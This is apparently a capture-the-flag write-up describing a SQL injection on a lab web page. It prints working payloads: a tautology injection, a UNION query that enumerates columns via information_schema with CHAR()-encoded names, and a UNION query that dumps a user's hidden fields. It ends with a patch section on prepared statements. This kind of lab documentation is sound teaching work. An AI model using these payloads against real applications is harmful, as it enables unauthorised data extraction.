# SQL Injection to Retrieve the Flag

## How We Found It  
The vulnerable page was:  
`http://10.12.248.148/?page=member`  
It asked for a member ID and displayed the corresponding first name and surname. We guessed that the backend was using a SQL query like:  
```sql
SELECT firstname, surname FROM users WHERE id = $user_input;
```

Since the user input wasn’t sanitized, we tried injecting:
```sql
1 OR 1=1
```
Which made the `WHERE` clause always true and listed all users. That’s when we noticed a suspicious user called Get the flag”.

We then injected another query to list all columns in the users table, something like:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=CHAR(117, 115, 101, 114, 115)
```

Here we can use the `UNION` to show totally different sql result from the hardcoded one in the remote machine. We also needed to add a `, NULL` because both `SELECT` of an `UNION` needs to have the same amount of columns shown.

Among the columns, we found `commentaire` and `countersign`. So we targeted the user with `firstname='flag'` and dumped their commentaire and countersign.

Final SQL Payload:
```sql
1 UNION SELECT Commentaire, countersign FROM users WHERE first_name=CHAR(70,108,97,103) 
```

Here’s what we got:

- **Commentaire**: Decrypt this password -> then lower all the char. Sh256 on it and it's good !

- **Countersign**: 5ff9d0165b4f92b14994e5c685cdce28

We followed the instructions, decrypted the password, lowercased it, hashed it with SHA256… and boom: we got the flag.

## Utility of It

SQL injection is extremely dangerous in real-world apps. It can let attackers access, modify, or delete database content. In our case, we used it to explore the DB structure and steal sensitive info (the flag), but in the wild, it could mean full data leaks or even remote code execution.

## How Can We Patch It

Never trust user input. Always use prepared statements or parameterized queries, and validate the type and format of incoming data. Don’t build SQL queries by directly concatenating user-provided values.